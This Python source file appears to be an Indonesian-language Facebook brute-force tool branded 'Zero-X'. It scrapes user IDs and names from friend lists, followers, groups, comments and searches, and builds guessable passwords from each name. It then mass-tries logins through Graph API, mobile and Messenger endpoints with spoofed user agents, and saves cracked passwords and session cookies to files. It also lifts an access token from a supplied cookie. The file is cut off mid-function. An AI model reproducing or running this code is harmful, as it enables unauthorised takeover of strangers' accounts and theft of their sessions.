# // Informasi Author //
Author = "Fall Xavier"
Facebook = "https://www.facebook.com/fallxavier.xyz"

# // Import Module //
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, string, base64, subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from requests.exceptions import ConnectionError
ses = requests.Session()

# // Import Nama //
M = "\x1b[1;91m" # MERAH
H = "\x1b[1;92m" # HIJAU
K = "\x1b[1;93m" # KUNING
N = "\x1b[0m"	# WARNA MATI
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
color_table = "#FFFFFF"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
M3 = "#FF0000" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "#00FF00" # HIJAU
K2 = "[#FFFF00]" # KUNING
K3 = "#FFFF00" # KUNING
B2 = "[#00C8FF]" # BIRU
B3 = "#00C8FF" # BIRU
U2 = "[#AF00FF]" # UNGU
U3 = "#AF00FF" # UNGU
N2 = "[#FF00FF]" # PINK
N3 = "#FF00FF" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
O3 = "#00FFFF" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
P3 = "#FFFFFF" # PUTIH
J2 = "[#FF8F00]" # JINGGA
J3 = "#FF8F00" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
# // Buat List Dll //
loop = 0
ok,cp,idz,files,tampung,metode,ugent,sandi = [],[],[],[],[],[],[],[]
hari_ini = datetime.now().strftime("%A-%d-%B-%Y")

# // Hapus File Login //
def hapus_login():
	try:os.remove("data/cookie")
	except:pass
	try:os.remove("data/token")
	except:pass
	
# // Logo //
def logo():
	os.system("clear")
	print(f"""
 ######## ######## ########   #######  ##     ## 
      ##  ##       ##     ## ##     ##  ##   ##  
     ##   ##       ##     ## ##     ##   ## ##   
    ##    ######   ########  ##     ##    ###    
   ##     ##       ##   ##   ##     ##   ## ##   
  ##      ##       ##    ##  ##     ##  ##   ##  
 ######## ######## ##     ##  #######  ##     ## 
     - {H}Zero-X Multi BruteForce Facebook{N} -
""")

###-----[ LOGIN COOKIES ]-----###
def login():
	try:
		logo()
		os.system('clear')
		ses = requests.Session()
		cookie = input(f'{K} [•]{P} Cookies : ')
		if cookie == '':
			print(f'\n{K}[{P}!{K}]{P} Jangan Kosong')
			time.sleep(3)
			login()
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open("data/token", "w").write(tok)
		cokiew = open("data/cookie", "w").write(cookie)
		print(f'\n{P}[{P}•{P}]{P} Login Berhasil\n    Ketik {P}python run.py')
		
		exit()
	except Exception as e:
		os.system("rm -f data/token")
		os.system("rm -f data/cookie")
		print(f'\n{P}[{P}!{P}] {x}Login Gagal\n{k}[{x}!{k}]{x} Pastikan Cookies Benar !')
		exit()
	
# // Menu Utama //
def menu():
	logo()
	try:
		cookie = {"cookie": open("data/cookie","r").read()}
		token = open("data/token","r").read()
		url = ses.get(f"https://graph.facebook.com/me?access_token={token}",cookies=cookie).json()
		nama = url["name"]
		idakun = url["id"]
	except ConnectionError:
		exit(" Tidak Dapat Terhubung. Cek Kembali Koneksi Kamu")
	except FileNotFoundError:
		hapus_login()
		login()
	except (KeyError,IOError):
		print(" Akun Terkena Checkpoint. Silahkan Login Kembali")
		time.sleep(2)
		hapus_login()
		login()
	print(f" Nama : {H}{nama}{N}")
	print(f" ID   : {H}{idakun}{N}")
	print(f"\n [{K}01{N}]. Crack Dari Daftar Teman")
	print(f" [{K}02{N}]. Crack Dari Pencarian Nama")
	print(f" [{K}03{N}]. Crack Dari Daftar Pengikut")
	print(f" [{K}04{N}]. Crack Dari Reaction Postingan")
	print(f" [{K}05{N}]. Crack Dari Komentar Postingan")
	print(f" [{K}06{N}]. Crack Dari Member Grup")
	print(f" [{K}07{N}]. Crack Dari Random Email")
	print(f" [{K}08{N}]. Crack Dari Random Username")
	print(f" [{K}09{N}]. Crack Dari File Sendiri")
	print(f" [{K}10{N}]. Lihat Akun Hasil Crack")
	print(f" [{K}00{N}]. Logout ({M}Hapus Login{N})")
	ask = input("\n Pilih Menu : ")
	if ask in ["1","01"]:
		idt = input('>> ID Target : ')
		dump(idt,"",{"cookie":cookie},token)
		aturmetode()
	elif ask in ["2","02"]:
		print(" Ketik Nama Yang Mau Kamu Cari/Dump")
		user = input(" Masukan Nama : ")
		file = open("asset/nama_indonesia","r").read().splitlines()
		try:
			for lengkap in file:
				for nama in lengkap.split(" "):
					nam = nama+" "+user
					dump_pencarianv1(f"https://mbasic.facebook.com/public/{nam}")
		except:
			pass
		aturmetode()
	elif ask in ["3","03"]:
		print(" Ketik 'me' Untuk Crack Dari Daftar Followers Sendiri")
		user = input(" Masukan ID Atau Username : ")
		if user in ["me","Me"]:
			user = "me"
		elif (re.findall("[a-zA-Z]",user)):
			user = user_ke_id(user)
		dump_followers(f"https://graph.facebook.com/{user}/subscribers?limit=1000&access_token={token}",cookie)
		aturmetode()
	elif ask in ["5","05"]:
		print(" Ketik ID Postingan Yang Mau Kamu Dump Komennya")
		user = input(" Masukan ID Postingan : ")
		dump_komentar(f"https://mbasic.facebook.com/{user}")
	elif ask in ["6","06"]:
		print(" Ketik ID Grup Yang Mau Kamu Dump Membernya")
		user = input(" Masukan ID Grup : ")
		dump_membergrup(f"https://mbasic.facebook.com/groups/{user}",cookie)
		aturmetode()
	elif ask in ["7","07"]:
		print(" Ketik Nama Yang Mau Kamu Dump Emailnya")
		user = input(" Masukan Nama : ")
		domain = input(" Masukan Domain : ")
		jumlah = input(" Masukan Jumlah : ")
		dump_emailv1(user,domain,jumlah)
		aturmetode()
	elif ask in ["8","08"]:
		print(" Ketik Nama Yang Mau Kamu Dump Usernamenya")
		user = input(" Masukan Nama : ")
		jumlah = input(" Masukan Jumlah : ")
		dump_username(user,jumlah)
		aturmetode()
	elif ask in ["9","09"]:
		print(" Ketik Lokasi File Yang Mau Kamu Crack")
		user = input(" Masukan Lokasi File : ")
		dump_file(user)
		aturmetode()
	elif ask in ["10"]:
		cek_hasil()
	elif ask in ["0","00"]:
		cek = input(" Apakah Yakin Ingin Logout?[Y/t] : ")
		if cek in ["y","Y"]:
			hapus_login()
			exit(f" [{H}#{N}] {H}Berhasil Logout. Silahkan Mulai Ulang")
		else:
			menu()
	elif ask in ["3","03","4","04"]:
		exit(" Fitur Masih Belum Tersedia Silahkan Menunggu Update Dari Author")
	else:
		exit(" Fitur Tidak Ada. Masukan Sesuai Angka Tertera Di Menu")

# // Convert User Ke ID //
def user_ke_id(user):
	try:
		url = ses.get("https://mbasic.facebook.com/"+user).text
		uid = re.findall('\;rid\=(\d+)\&',str(url))[0]
		return uid
	except:
		return uid

###-----[ DUMP OTOMATIS ]-----###
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

# // Dump Teman//
def dump_teman(url,cookie):
	try:
		url = ses.get(url,cookies=cookie)
		jason = json.loads(url.text)
		for i in jason["friends"]["data"]:
			idz.append(i["id"]+"<=>"+i["name"])
			sys.stdout.write(f"\r Sedang Mengumpulkan {len(idz)} ID....");sys.stdout.flush()
	except:pass

# // Dump Followers //
def dump_followers(url,cookie):
	try:
		url = ses.get(url,cookies=cookie)
		jason = json.loads(url.text)
		for i in jason["data"]:
			idz.append(i["id"]+"<=>"+i["name"])
			sys.stdout.write(f"\r Sedang Mengumpulkan {len(idz)} ID....");sys.stdout.flush()
		dump_followers(jason["paging"]["next"],cookie)
	except:pass

# // Dump Komentar //
def dump_komentar(url):
	try:
		data = parser(ses.get(url).text,"html.parser")
		for isi in data.find_all("h3"):
			for ids in isi.find_all("a",href=True):
				if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
				else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
				nama = ids.text
				if uid+"<=>"+nama in idz:pass
				else:idz.append(uid+"<=>"+nama)
				sys.stdout.write(f"\r Sedang Mengumpulkan {len(idz)} ID....");sys.stdout.flush()
		for z in data.find_all("a",href=True):
			if "Lihat komentar sebelumnyaâ€¦" in z.text:
				dump_komentar("https://mbasic.facebook.com"+z["href"])
	except:pass
		
# // Dump Pencarian No Login //
def dump_pencarianv1(url):
	try:
		data = parser(ses.get(url).text,'html.parser')
		for z in data.find_all("td"):
			namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
			for uid,nama in namp:
				if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
				elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
				if uid+"<=>"+nama in idz:pass
				else:idz.append(uid+"<=>"+nama)
				sys.stdout.write(f"\r Sedang Mengumpulkan {len(idz)} ID....");sys.stdout.flush()
		for x in data.find_all("a",href=True):
			if "Lihat Hasil Selanjutnya" in x.text:
				dump_pencarianv1(x.get("href"))
	except:pass
	
# // Dump Member Grup //
def dump_membergrup(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
		judul = re.findall("<title>(.*?)</title>",str(data))[0]
		for isi in data.find_all("h3"):
			for ids in isi.find_all("a",href=True):
				if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
				else:
					if ids.text==judul:pass
					else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
				if uid+"<=>"+nama in idz:pass
				else:idz.append(uid+"<=>"+nama)
				sys.stdout.write(f"\r Sedang Mengumpulkan {len(idz)} ID....");sys.stdout.flush()
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				dump_membergrup("https://mbasic.facebook.com"+x.get("href"),cookie)
	except:pass
		
# // Dump File //
def dump_file(lok):
	try:
		file = open(lok,"r").read().splitlines()
		for data in file:
			if "|" in data:
				user,nama = data.split("|")
				idz.append(user+"<=>"+nama)
			elif "â€¢" in data:
				user,nama = data.split("â€¢")
				idz.append(user+"<=>"+nama)
			else:
				idz.append(data)
			sys.stdout.write(f"\r Sedang Mengumpulkan {len(idz)} ID....");sys.stdout.flush()
	except:pass
		
# // Dump Email V1 //
def dump_emailv1(nama,domain,jumlah):
	try:
		for z in range(int(jumlah)):
			if len(nama.split()) > 1:
				email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
			else:
				email = str(nama)+str(z)+str(domain)+"<=>"+str(nama)
			if email in idz:pass
			else:idz.append(email)
			sys.stdout.write(f"\r Sedang Mengumpulkan {len(idz)} ID....");sys.stdout.flush()
	except:pass
		
# // Dump Username //
def dump_username(nama,jumlah):
	try:
		for z in range(int(jumlah)):
			if "." in nama:
				user = str(nama)+"."+str(z)+"<=>"+str(nama.replace("."," "))
			else:
				user = str(nama)+"."+str(z)+"<=>"+str(nama)
			if user in idz:pass
			else:idz.append(user)
			sys.stdout.write(f"\r Sedang Mengumpulkan {len(idz)} ID....");sys.stdout.flush()
	except:pass
		
# // Cek Hasil Crack //
def cek_hasil():
	print(f"\n [{K}01{N}]. Lihat Hasil Crack OK")
	print(f" [{K}02{N}]. Lihat Hasil Crack CP")
	res = input("\n Pilih menu : ")
	if res in["1","01"]:
		folder = "OK"
	else:
		folder = "CP"
	num = 0
	print("")
	dirs = os.listdir(folder)
	for file in dirs:
		num += 1
		files.append(file)
		print(f" [{K}{num}{N}]. {file}")
	ask = input("\n Masukan Nomer : ")
	try:
		fail = files[int(ask)-1]
		file = open(folder+"/"+fail,"r").read().splitlines()
	except:
		print("file tidak ada")
	print(f"\n [{K}+{N}] Tanggal : {H}{fail}{N} - Total : {H}{len(file)}{N}\n")
	for z in file:
		if "OK" in folder:print(f"{H}{z}{N}")
		else:print(f"{K}{z}{N}")
	print(f"\n [{K}#{N}] Berhasil Mengecek Total {H}{len(file)}{N} Akun")
	exit()

# // Atur Metode //
def aturmetode():
	if len(idz) == 0:
		exit(" Gagal Mengambil ID/Private. Silahkan Mulai Ulang ")
	else:
		print("")
	print(f"      [ {H}Pilih Metode Login Dan Coba Satu PerSatu{N} ]")
	print(f"\n [{H}01{N}]. Metode Login {H}Api{N}    [{H}03{N}]. Metode Login {H}Validate{N}")
	print(f" [{H}02{N}]. Metode Login {H}Async{N}  [{H}04{N}]. Metode Login {H}Messenger{N}")
	mtd = input("\n Pilih Metode : ")
	if mtd in ["1","01"]:
		metode.append("api")
	elif mtd in ["2","02"]:
		metode.append("async")
	elif mtd in ["3","03"]:
		metode.append("validate")
	elif mtd in ["4","04"]:
		metode.append("messenger")
	else:
		aturmetode()
	atursandi()
	
# // Atur Sandi //
def atursandi():
	print(f"      [ {H}Pilih Kombinasi Sandi Yang Cocok{N} ]")
	print(f"\n [{H}01{N}]. Sandi {H}Otomatis{N}  [{H}03{N}]. Sandi {H}Gabungan{N}")
	print(f" [{H}02{N}]. Sandi {H}Manual{N}    [{H}04{N}]. Sandi {H}Belakang Nama{N}")
	sd = input("\n Pilih Sandi : ")
	if sd in ["2","02","3","03"]:
		print(" Ketik Sandi Dengan , (Koma) Sebagai Pemisah. Contoh : sayang,rahasia,bismillah,123456")
		pw = input(" Masukan Sandi : ")
	gen = input(" Gunakan UserAgent Manual[Y/t] : ")
	if gen in ["y","Y"]:
		ua = input(" Masukan UserAgent : ")
		ugent.append(ua)
	else:
		ugent.append("kontol")
	if sd in ["1","01"]:
		otomatis("")
	elif sd in ["2","02"]:
		manual(pw)
	elif sd in ["3","03"]:
		sandi.append("gabung")
		otomatis(pw)
	elif sd in ["4","04"]:
		print(" Ketik Sandi Dengan , (Koma) Sebagai Pemisah. Contoh : gans,cantik,ganteng,tzy")
		pwz = input(" Masukan Tambahan : ")
		sandi.append("tambah")
		otomatis(pwz)
	
# // Sandi Otomatis //
def otomatis(pw):
	simpan()
	with ThreadPoolExecutor(max_workers=30) as fall:
		for data in idz:
			try:
				user,lengkap = data.split("<=>")
				nama = lengkap.split(" ")
				if len(nama) > 1:
					if len(nama[0]) > 5:
						pwx = [lengkap,nama[0],nama[0]+"123",nama[0]+"12345",nama[1],nama[1]+"123",nama[1]+"12345"]
					else:
						pwx = [lengkap,nama[0]+"123",nama[0]+"12345",nama[1]+"123",nama[1]+"12345"]
				else:
					if len(nama[0]) > 5:
						pwx = [lengkap,nama[0],nama[0]+"123",nama[0]+"12345"]
					else:
						pwx = [lengkap,nama[0]+"123",nama[0]+"12345"]
				if "gabung" in sandi:
					for z in pw.split(","):
						pwx.append(z)
				if "tambah" in sandi:
					for z in pw.split(","):
						pwx.append(nama[0]+z)
				if "api" in metode:
					fall.submit(metode_api,user,pwx)
				elif "async" in metode:
					fall.submit(metode_async,user,pwx)
				elif "validate" in metode:
					fall.submit(metode_validate,user,pwx)
				elif "messenger" in metode:
					fall.submit(metode_messenger,user,pwx)
			except:pass
	exit(f"\n\n {N}Berhasil Crack {len(idz)} ID Dan Mendapatkan OK : {len(ok)} - CP : {len(cp)}")

# // Sandi Manual //
def manual(pw):
	simpan()
	with ThreadPoolExecutor(max_workers=30) as fall:
		for data in idz:
			try:
				pwx = []
				user,lengkap = data.split("<=>")
				for z in pw.split(","):
					pwx.append(z)
				if "api" in metode:
					fall.submit(metode_api,user,pwx)
				elif "async" in metode:
					fall.submit(metode_async,user,pwx)
				elif "validate" in metode:
					fall.submit(metode_validate,user,pwx)
				elif "messenger" in metode:
					fall.submit(metode_messenger,user,pwx)
			except:pass
	exit(f"\n\n {N}Berhasil Crack {len(idz)} ID Dan Mendapatkan OK : {len(ok)} - CP : {len(cp)}")

# // Metode Api //
def metode_api(email,pwx):
	global loop,ok,cp
	sys.stdout.write(f"\r {N}Crack {H}{email}{N} {loop}/{len(idz)}  OK : {len(ok)} - CP : {len(cp)} "),
	sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			if "kontol" in ugent:
				ua = useragent_api()
			else:
				ua = ugent[0]
			params = {"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","sdk_version": f"{str(random.randint(1,26))}", "email": email,"locale": "en_US","password": pw,"sdk": "android","generate_session_cookies": "1","sig": "4f648f21fb58fcd2aa1c65f35f441ef5"}
			headers = {"Host": "graph.facebook.com","x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","user-agent": ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
			post = ses.post(f"https://graph.facebook.com/auth/login",params=params, headers=headers)
			if "session_key" in post.text and "EAA" in post.text:
				coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
				cookie = f"sb="+base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")+";{coki}"
				user = re.findall("c_user=(\d+)",cookie)[0]
				if user in ok or user in cp:
					break
				else:
					ok.append(user)
					print(f"\r  {H}* --> {user}|{pw}|{cookie}                ")
					open(f"OK/{hari_ini}","a").write(f"  * --> {user}|{pw}|{cookie}\n")
					break
			elif "User must verify their account on www.facebook.com" in post.json()["error"]["message"]:
				user = post.json()["error"]["error_data"]["uid"]
				if user in ok or user in cp:
					break
				else:
					cp.append(user)
					print(f"\r  {K}* --> {user}|{pw}                ")
					open(f"CP/{hari_ini}","a").write(f"  * --> {user}|{pw}\n")
					break
			else:continue
	#except ConnectionError:
	except Exception as e:
		print(e)
		#time.sleep(30)
		#metode_api(user,pwx)
	loop +=1
	
# // Metode Async //
def metode_async(email,pwx):
	global loop,ok,cp
	sys.stdout.write(f"\r {N}Crack {H}{email}{N} {loop}/{len(idz)}  OK : {len(ok)} - CP : {len(cp)} "),
	sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			if "kontol" in ugent:
				ua = useragent_biasa()
			else:
				ua = ugent[0]
			get = ses.get(f"https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(get)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(get)).group(1),"m_ts": re.search('name="m_ts" value="(.*?)"', str(get)).group(1),"li": re.search('name="li" value="(.*?)"', str(get)).group(1),"try_number": "0","unrecognized_tries": "0","email": email,"pass": pw,"bi_xrwh": "0","prefill_contact_point": f"{email} {pw}","prefill_source": "browser_dropdown","prefill_type": "password","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": True,"is_smart_lock": False,"bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"next": f"https://m.facebook.com/login/save-device/?login_source=login"}
			headers = {"Host": "m.facebook.com","origin": "https://m.facebook.com","upgrade-insecure-requests": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="98"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": '"Android"',"sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": f"https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","content-type": "application/x-www-form-urlencoded","content-length": str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),"x-fb-lsd": data.get("lsd"),"x-requested-with": "XMLHttpRequest","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://m.facebook.com/login/device-based/async/login/?refsrc=deprecated&lwv=100", data=data, headers=headers)
			if "c_user" in ses.cookies.get_dict():
				cookie= ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				user = re.findall("c_user=(\d+)",cookie)[0]
				if user in ok or user in cp:
					break
				else:
					ok.append(user)
					print(f"\r  {H}* --> {user}|{pw}|{cookie}                ")
					open(f"OK/{hari_ini}","a").write(f"  * --> {user}|{pw}|{cookie}\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if user in ok or user in cp:
					break
				else:
					cp.append(user)
					print(f"\r  {K}* --> {user}|{pw}                ")
					open(f"CP/{hari_ini}","a").write(f"  * --> {user}|{pw}\n")
					break
			else:continue
	except ConnectionError:
		time.sleep(30)
		metode_async(user,pwx)
	loop +=1
	
# // Metode Validate //
def metode_validate(email,pwx):
	global loop,ok,cp
	sys.stdout.write(f"\r {N}Crack {H}{email}{N} {loop}/{len(idz)}  OK : {len(ok)} - CP : {len(cp)} "),
	sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			if "kontol" in ugent:
				ua = useragent_biasa()
			else:
				ua = ugent[0]
			get = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={email}&flow=login_no_pin&hbl=0&refsrc=deprecated").text
			data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(get)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(get)).group(1),
				"uid": email,
				"pass": pw,
				"flow": "login_no_pin",
				"next": f"https://m.facebook.com/login/save-device/?login_source=login"
			}
			headers = {"Host": "m.facebook.com","origin": "https://m.facebook.com","upgrade-insecure-requests": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="98"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": '"Android"',"sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": f"https://m.facebook.com/login/device-based/password/?uid={email}&flow=login_no_pin&hbl=0&refsrc=deprecated","content-type": "application/x-www-form-urlencoded","content-length": str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),"x-fb-lsd": data.get("lsd"),"x-requested-with": "XMLHttpRequest","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data, headers=headers)
			if "c_user" in ses.cookies.get_dict():
				cookie= ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				user = re.findall("c_user=(\d+)",cookie)[0]
				if user in ok or user in cp:
					break
				else:
					ok.append(user)
					print(f"\r  {H}* --> {user}|{pw}|{cookie}                ")
					open(f"OK/{hari_ini}","a").write(f"  * --> {user}|{pw}|{cookie}\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if user in ok or user in cp:
					break
				else:
					cp.append(user)
					print(f"\r  {K}* --> {user}|{pw}                ")
					open(f"CP/{hari_ini}","a").write(f"  * --> {user}|{pw}\n")
					break
			else:continue
	except ConnectionError:
		time.sleep(30)
		metode_validate(user,pwx)
	loop +=1
	
# // Metode Messenger //
def metode_messenger(email,pwx):
	global loop,ok,cp
	sys.stdout.write(f"\r {N}Crack {H}{email}{N} {loop}/{len(idz)}  OK : {len(ok)} - CP : {len(cp)} "),
	sys.stdout.flush()
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			if "kontol" in ugent:
				ua = useragent_messenger()
			else:
				ua = ugent[0]
			get = ses.get(f"https://www.messenger.com/").text
			data = {
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(get)).group(1),
				"lsd": re.search('name="lsd" value="(.*?)"', str(get)).group(1),
				"initial_request_id": re.search('name="initial_request_id" value="(.*?)"', str(get)).group(1),
				"timezone": "-420",
				"lgndim": "",
				"lgnrnd": re.search('name="lgnrnd" value="(.*?)"', str(get)).group(1),
				"lgnjs": re.search('name="lgnjs" value="(.*?)"', str(get)).group(1),
				"default_persistent": "0",
				"email": email,
				"pass": pw,
				"login": "1",
				"persistent": "1"
			}
			headers = {"Host": "www.messenger.com","origin": "https://www.messenger.com","upgrade-insecure-requests": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="98"',"sec-ch-ua-mobile": "?1","sec-ch-ua-platform": '"Android"',"sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": f"https://www.messenger.com/","content-type": "application/x-www-form-urlencoded","content-length": str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ]))),"x-fb-lsd": data.get("lsd"),"x-requested-with": "XMLHttpRequest","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers)
			if "c_user" in ses.cookies.get_dict():
				cookie= ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				user = re.findall("c_user=(\d+)",cookie)[0]
				if user in ok or user in cp:
					break
				else:
					ok.append(user)
					print(f"\r  {H}* --> {user}|{pw}|{cookie}                ")
					open(f"OK/{hari_ini}","a").write(f"  * --> {user}|{pw}|{cookie}\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				if user in ok or user in cp:
					break
				else:
					cp.append(user)
					print(f"\r  {K}* --> {user}|{pw}                ")
					open(f"CP/{hari_ini}","a").write(f"  * --> {user}|{pw}\n")
					break
			else:continue
	except ConnectionError:
		time.sleep(30)
		metode_messenger(user,pwx)
	loop +=1
		
# // Simpan Hasil //
def simpan():
	print(f"\n Hasil OK Di Simpan Ke {H}OK/{hari_ini}{N}")
	print(f" Hasil CP Di Simpan Ke {K}CP/{hari_ini}{N}")
	print(f" Mainkan Mode Pesawat Setiap {H}300{N} ID\n")

# // UserAgent Api //
def useragent_api():
	versi_android = str(random.randint(4,12))+".0.0"
	model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
	build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
	large_device = "{density=2.25,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")+"}"
	merk_device = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
	brand_device = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
	cpu_device = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
	versi_app = str(random.randint(111111111,999999999))
	language = "en_US"
